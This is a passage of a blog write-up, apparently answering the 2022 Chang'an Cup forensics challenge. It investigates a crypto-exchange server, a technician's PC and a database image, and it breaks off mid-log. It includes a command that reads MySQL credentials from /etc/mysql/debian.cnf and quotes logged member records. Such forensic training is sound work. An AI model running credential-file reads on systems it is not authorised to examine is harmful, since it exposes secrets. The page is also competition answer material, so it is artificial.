@@ -1,0 +1,554 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>22长安杯 | Yiyi</title><meta name="author" content="yiyi"><meta name="copyright" content="yiyi"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="检材1根据报案人提供的网站域名和IP，警方调取了对应的服务器镜像“检材1”，分析掌握的检材回答下列问题  检材1的SHA256值为    分析检材1，搭建该服务器的技术员IP地址是多少？用该地址解压检材2    检材1中，操作系统发行版本号为    检材1系统中，网卡绑定的静态IP地址为    检材1中，网站jar包所存放的目录是(答案为绝对路径，如“homehonglian”)10分答案为绝对路">
+<meta property="og:type" content="article">
+<meta property="og:title" content="22长安杯">
+<meta property="og:url" content="https://xyaxxya.github.io/posts/11117.html">
+<meta property="og:site_name" content="Yiyi">
+<meta property="og:description" content="检材1根据报案人提供的网站域名和IP，警方调取了对应的服务器镜像“检材1”，分析掌握的检材回答下列问题  检材1的SHA256值为    分析检材1，搭建该服务器的技术员IP地址是多少？用该地址解压检材2    检材1中，操作系统发行版本号为    检材1系统中，网卡绑定的静态IP地址为    检材1中，网站jar包所存放的目录是(答案为绝对路径，如“homehonglian”)10分答案为绝对路">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://www.dmoe.cc/random.php?8077">
+<meta property="article:published_time" content="2024-07-11T13:19:21.000Z">
+<meta property="article:modified_time" content="2024-07-17T08:00:39.634Z">
+<meta property="article:author" content="yiyi">
+<meta property="article:tag" content="电子取证">
+<meta property="article:tag" content="PC">
+<meta property="article:tag" content="服务器">
+<meta property="article:tag" content="wp">
+<meta property="article:tag" content="APK">
+<meta property="article:tag" content="java">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://www.dmoe.cc/random.php?8077"><link rel="shortcut icon" href="https://s2.loli.net/2024/02/16/Ixe9Cyq2mFBj74T.jpg"><link rel="canonical" href="https://xyaxxya.github.io/posts/11117.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.12.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: true,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '22长安杯',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-07-17 16:00:39'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.1.1"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://s2.loli.net/2024/02/16/Ixe9Cyq2mFBj74T.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">66</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">76</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="https://xyaxxya.github.io/"><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/tags"><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories"><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/archives"><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="https://xyaxxya.github.io/2024/02/16/关于我"><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://www.dmoe.cc/random.php?8077')"><nav id="nav"><span id="blog-info"><a href="/" title="Yiyi"><img class="site-icon" src="https://s2.loli.net/2024/02/16/Ixe9Cyq2mFBj74T.jpg"/><span class="site-name">Yiyi</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="https://xyaxxya.github.io/"><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/tags"><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories"><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/archives"><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="https://xyaxxya.github.io/2024/02/16/关于我"><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">22长安杯</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-07-11T13:19:21.000Z" title="发表于 2024-07-11 21:19:21">2024-07-11</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-07-17T08:00:39.634Z" title="更新于 2024-07-17 16:00:39">2024-07-17</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/">电子取证</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/wp/">wp</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">6.1k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>29分钟</span></span><span class="post-meta-separator">|</span><span class="leancloud_visitors" id="/posts/11117.html" data-flag-title="22长安杯"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span class="leancloud-visitors-count"><i class="fa-solid fa-spinner fa-spin"></i></span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/posts/11117.html#post-comment" itemprop="discussionUrl"><span class="valine-comment-count" data-xid="/posts/11117.html" itemprop="commentCount"><i class="fa-solid fa-spinner fa-spin"></i></span></a></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="检材1"><a href="#检材1" class="headerlink" title="检材1"></a>检材1</h1><p>根据报案人提供的网站域名和IP，警方调取了对应的服务器镜像“检材1”，分析掌握的检材回答下列问题</p>
+<ol>
+<li>检材1的SHA256值为</li>
+</ol>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240710222138279.png" alt="image-20240710222138279"></p>
+<ol start="2">
+<li>分析检材1，搭建该服务器的技术员IP地址是多少？用该地址解压检材2</li>
+</ol>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240710222531615.png" alt="image-20240710222531615"></p>
+<ol start="3">
+<li>检材1中，操作系统发行版本号为</li>
+</ol>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240710222317141.png" alt="image-20240710222317141"></p>
+<ol start="4">
+<li>检材1系统中，网卡绑定的静态IP地址为</li>
+</ol>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240710222557592.png" alt="image-20240710222557592"></p>
+<ol start="5">
+<li>检材1中，网站jar包所存放的目录是(答案为绝对路径，如“homehonglian”)10分<br>答案为绝对路径，如“homehonglian”</li>
+</ol>
+<p>历史命令</p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240710223337944.png" alt="image-20240710223337944"></p>
+<p>仔细看一圈历史命令可以发现上面一大堆jar包的处理后执行了一个sh文件，可以猜测这是一个启动命令</p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240710224337106.png" alt="image-20240710224337106"></p>
+<p>进去查找的时候发现没有，再看history发现已经被删除了</p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240710224553865.png" alt="image-20240710224553865"></p>
+<ol start="6">
+<li>检材1中，监听7000端口的进程对应文件名为</li>
+</ol>
+<p>分析jar包可以看出是个spring boot框架，他有个比较重要的配置文件</p>
+<ul>
+<li><strong>application.properties:</strong> 这是 Spring 	Boot 默认的配置文件，使用 key-value 格式，以 . 分隔层级结构。</li>
+<li><strong>application.yml:</strong> 使用 YAML 格式，以缩进表示层级结构，更易读。</li>
+</ul>
+<p>逐个分析jar包，<strong>cloud.jar</strong>中找到对应端口</p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240710224728238.png" alt="image-20240710224728238"></p>
+<p><strong>admin-api</strong>中找到了mysql的ip和账号密码</p>
+<p>并且可以看到用了mysql，mongodb，redis三种数据库</p>
+<p>并且用了卡夫卡的系统，zookeeper的框架</p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240710224848438.png" alt="image-20240710224848438"></p>
+<p>exchange.jar</p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240710225739008.png" alt="image-20240710225739008"></p>
+<p>剩下的jar包也如此</p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240710230140287.png" alt="image-20240710230140287"></p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240710230210690.png" alt="image-20240710230210690"></p>
+<p>总之就是一个172的ip一个192的ip，做个记录</p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240710230237277.png" alt="image-20240710230237277"></p>
+<p>检材二简单分析一下不难看出是开发人员的PC</p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240710230406629.png" alt="image-20240710230406629"></p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240710230426916.png" alt="image-20240710230426916"></p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240710230433380.png" alt="image-20240710230433380"></p>
+<p>并且在D盘找到了两个启动命令</p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240710230656453.png" alt="image-20240710230656453"></p>
+<p>还发现了一个建站笔记</p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240710230746116.png" alt="image-20240710230746116"></p>
+<p>启动顺序在start_web.jar中直接看到了，这个就是前端的启动命令</p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240710230828684.png" alt="image-20240710230828684"></p>
+<p>start.sh是后端的启动脚本</p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240710233516263.png" alt="image-20240710233516263"></p>
+<p>并且还有数据库的备份文件</p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240710231508148.png" alt="image-20240710231508148"></p>
+<p>pc部分比较简单，直接解开看检材三了，检材三就是数据库</p>
+<p>redis</p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240710232005805.png" alt="image-20240710232005805"></p>
+<p>mongodb</p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240710232039217.png" alt="image-20240710232039217"></p>
+<p>mysql</p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240710232310738.png" alt="image-20240710232310738"></p>
+<p>看mysql</p>
+<p>可以看到存在docker容器里，但是命令中出现多次&#x2F;data&#x2F;mysql,怀疑是映射</p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240710232442902.png" alt="image-20240710232442902"></p>
+<p>先把docker起了</p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240710232733498.png" alt="image-20240710232733498"></p>
+<p>通过docker-compose.yml可以看到该主机与docker之间存在映射关系，也就是说将数据库文件放在&#x2F;data&#x2F;mysql&#x2F;db目录下，就可以映射到docker内部</p>
+<ul>
+<li>端口的映射和目录的映射</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ports:</span><br><span class="line">  - 33050:3306</span><br><span class="line">volumes:</span><br><span class="line">  - /data/mysql/db:/var/lib/mysql</span><br><span class="line">  - /data/mysql/conf/my.cnf:/etc/mysql/my.cnf</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240710232807439.png" alt="image-20240710232807439"></p>
+<p>查看该目录时发现对应的目录啥也没有，只有自带的几个库，因此可以尝试把检材二中的备份文件导入</p>
+<p>根据jar包可知，需要导入的库为b1</p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240711002244389.png" alt="image-20240711002244389"></p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240710233209743.png" alt="image-20240710233209743"></p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240710233107384.png" alt="image-20240710233107384"></p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240710233335550.png" alt="image-20240710233335550"></p>
+<p>并给权限</p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240710233405643.png" alt="image-20240710233405643"></p>
+<p>然后去导入我们的前后端的启动脚本，导入后也要赋权限</p>
+<p>前端</p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240710234609834.png" alt="image-20240710234609834"></p>
+<p>后端</p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240710234552228.png" alt="image-20240710234552228"></p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240710234832000.png" alt="image-20240710234832000"></p>
+<p>访问对应的9090node节点和3000节点</p>
+<ul>
+<li>9090后台</li>
+</ul>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240710234818535.png" alt="image-20240710234818535"></p>
+<ul>
+<li>3000 前台</li>
+</ul>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240710235109935.png" alt="image-20240710235109935"></p>
+<ol start="7">
+<li>检材1中，网站管理后台页面对应的网络端口为（答案填写阿拉伯数字，如“100”）10分<br>（答案填写阿拉伯数字，如“100”）</li>
+</ol>
+<p>见上题</p>
+<ol start="8">
+<li>检材1中，网站前台页面里给出的APK的下载地址是（答案格式如下：“https<a target="_blank" rel="noopener" href="http://www.forensix.cnabcdef”)10分/">www.forensix.cnabcdef”)10分</a><br>（答案格式如下：“https<a target="_blank" rel="noopener" href="http://www.forensix.cnabcdef”/">www.forensix.cnabcdef”</a>)</li>
+</ol>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240710235244012.png" alt="image-20240710235244012"></p>
+<ol start="9">
+<li>检材1中，网站管理后台页面调用的用户表(admin)里的密码字段加密方式为</li>
+</ol>
+<p>随便登陆一下查看一下请求的地址</p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240710235648850.png" alt="image-20240710235648850"></p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240710235725416.png" alt="image-20240710235725416"></p>
+<p>去jar包里全局搜一下</p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240710235933633.png" alt="image-20240710235933633"></p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240710235951085.png" alt="image-20240710235951085"></p>
+<ol start="10">
+<li>分析检材1，网站管理后台登录密码加密算法中所使用的盐值是</li>
+</ol>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240711000148831.png" alt="image-20240711000148831"></p>
+<p>跳转后发现是一个全局变量（定义在方法外），于是在application.properties查找</p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240711000108562.png" alt="image-20240711000108562"></p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240711000308974.png" alt="image-20240711000308974"></p>
+<h1 id="检材2"><a href="#检材2" class="headerlink" title="检材2"></a>检材2</h1><p>根据IP地址落地及后续侦查，抓获了搭建网站的技术员，扣押了其个人电脑并制作镜像“检材2”，分析所有掌握的检材回答下列问题</p>
+<ol start="11">
+<li>检材2中，windows账户Web King的登录密码是</li>
+</ol>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240710230958844.png" alt="image-20240710230958844"></p>
+<ol start="12">
+<li>检材2中，除检材1以外，还远程连接过哪个IP地址？并用该地址解压检材3</li>
+</ol>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240710231029515.png" alt="image-20240710231029515"></p>
+<ol start="13">
+<li>检材2中，powershell中输入的最后一条命令是</li>
+</ol>
+<p>powereshell打开直接往上翻</p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240710231627189.png" alt="image-20240710231627189"></p>
+<ol start="14">
+<li>检材2中，下载的涉案网站源代码文件名为</li>
+</ol>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240711000649160.png" alt="image-20240711000649160"></p>
+<p>三个github上下载的，第一个是交易所，第三个是火币，结合浏览器记录分析得出是中间的goDCE</p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240711000642150.png" alt="image-20240711000642150"></p>
+<ol start="15">
+<li>检材2中，网站管理后台root账号的密码为</li>
+</ol>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240711000807332.png" alt="image-20240711000807332"></p>
+<ol start="16">
+<li>检材2中，技术员使用的WSL子系统发行版本是（答案格式如下：windows 10.1）10分<br>答案格式如下：windows 10.1</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wsl --list -v </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240711001026994.png" alt="image-20240711001026994"></p>
+<ol start="17">
+<li>检材2中，运行的数据库服务版本号是（答案格式如下：10.1）10分<br>答案格式如下：10.1</li>
+</ol>
+<p>本地输入mysql -V显示无数据库，在WSL中查看</p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240711001501790.png" alt="image-20240711001501790"></p>
+<ol start="18">
+<li>上述数据库debian-sys-maint用户的初始密码是</li>
+</ol>
+<p>root权限的密码是123456，猜测可能是火眼同时绕密了</p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240711001828605.png" alt="image-20240711001828605"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/mysql/debian.cnf</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240711001644859.png" alt="image-20240711001644859"></p>
+<h1 id="检材3"><a href="#检材3" class="headerlink" title="检材3"></a>检材3</h1><p>根据网站前端和技术员个人电脑上的线索，发现了网站后端所在的服务器IP并再次调证取得“检材3”，分析所有掌握的检材回答下列问题</p>
+<ol start="19">
+<li>检材3服务器root账号的密码是</li>
+</ol>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240711001936651.png" alt="image-20240711001936651"></p>
+<ol start="20">
+<li>检材3中，监听33050端口的程序名（program name）为</li>
+</ol>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240711002019688.png" alt="image-20240711002019688"></p>
+<ol start="21">
+<li>除MySQL外，该网站还依赖以下哪种数据库<br>Postgresql Redis Oracle MongoDB</li>
+</ol>
+<p>见上文</p>
+<ol start="22">
+<li>检材3中，MySQL数据库root账号的密码是</li>
+</ol>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240711002051814.png" alt="image-20240711002051814"></p>
+<ol start="23">
+<li>检材3中，MySQL数据库在容器内部的数据目录为</li>
+</ol>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240710232807439.png" alt="image-20240710232807439"></p>
+<ol start="24">
+<li>涉案网站调用的MySQL数据库名为</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b1</span><br></pre></td></tr></table></figure>
+
+
+<ol start="25">
+<li>勒索者在数据库中修改了多少个用户的手机号？(答案填写阿拉伯数字，如“15”)10分<br>(答案填写阿拉伯数字，如“15”)</li>
+</ol>
+<p>找一下日志文件</p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240711002552555.png" alt="image-20240711002552555"></p>
+<p>暴搜数据库更新关键词update</p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240711002740255.png" alt="image-20240711002740255"></p>
+<ol start="26">
+<li>勒索者在数据库中删除的用户数量为(答案填写阿拉伯数字，如“15”)10分<br>(答案填写阿拉伯数字，如“15”)</li>
+</ol>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240711002827308.png" alt="image-20240711002827308"></p>
+<ol start="27">
+<li>还原被破坏的数据库，分析除技术员以外，还有哪个IP地址登录过管理后台网站？用该地址解压检材4</li>
+</ol>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240711003116261.png" alt="image-20240711003116261"></p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240711003125167.png" alt="image-20240711003125167"></p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240711003308493.png" alt="image-20240711003308493"></p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240711003235611.png" alt="image-20240711003235611"></p>
+<ol start="28">
+<li>还原全部被删改数据，用户id为500的注册会员的HT币钱包地址为</li>
+</ol>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240711003459405.png" alt="image-20240711003459405"></p>
+<ol start="29">
+<li>还原全部被删改数据，共有多少名用户的会员等级为’LV3’(答案填写阿拉伯数字，如“15”)10分<br>(答案填写阿拉伯数字，如“15”)</li>
+</ol>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240711003545491.png" alt="image-20240711003545491"></p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240711003609569.png" alt="image-20240711003609569"></p>
+<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240711003653504.png" alt="image-20240711003653504"></p>
+<p>但是需要加上被删除的几个人：973-1000</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">2:07.961675Z	   12 Query	INSERT INTO `member` VALUES (973, NULL, NULL, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, NULL, &#x27;中国&#x27;, NULL, NULL, 0, 0, NULL, 0, &#x27;13532680973&#x27;, &#x27;ee455f8f8e5d321861ed7ef5bde6dbc5&#x27;, &#x27;U000001Lo973&#x27;, 1, NULL, 0, &#x27;2022-10-18 13:4:24&#x27;, &#x27;353233323433333238363833323439363634&#x27;, 0, b&#x27;1&#x27;, 0, 0, &#x27;c3d54ed7-b20f-430b-8f9a-b517c1973&#x27;, &#x27;2022-10-18 13:4:24&#x27;, 1, NULL, 0, &#x27;13532680973&#x27;, NULL, NULL, &#x27;中国&#x27;, 0, 3, 0, 0, NULL)</span><br><span class="line">2022-10-19T03:12:07.968287Z	   12 Query	INSERT INTO `member` VALUES (974, NULL, NULL, 0, 0, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, NULL, 0, NULL, NULL, 0, NULL, NULL, 0, NULL, NULL, NULL, &#x27;中国&#x27;, NULL, NULL, 0, 0, NULL, 0, &#x27;13176680974&#x27;, &#x27;ee455f8f8e5d321861ed7ef5bde6dbc5&#x27;, &#x27;U000001Lo974&#x27;, 1, NULL, 0, &#x27;2022-10-18 14:14:4&#x27;, &#x27;353233323433333238363833323439363634&#x27;, 0, b&#x27;1&#x27;, 0, 0, &#x27;c3d54ed7-b20f-430b-8f9a-b517c1974&#x27;, &#x27;2022-10-18 14:14:4&#x27;, 1, NULL, 0, &#x27;13176680974&#x27;, NULL, NULL, &#x27;中国&#x27;, 0, 5, 0, 0, NULL)</span><br><span class="line">2022-10-19T03:12:07.974085Z	   12 Query	INSERT INTO `member` VALUES (975, NULL, NULL, 0, 0, NULL, NULL, NULL, NULL, 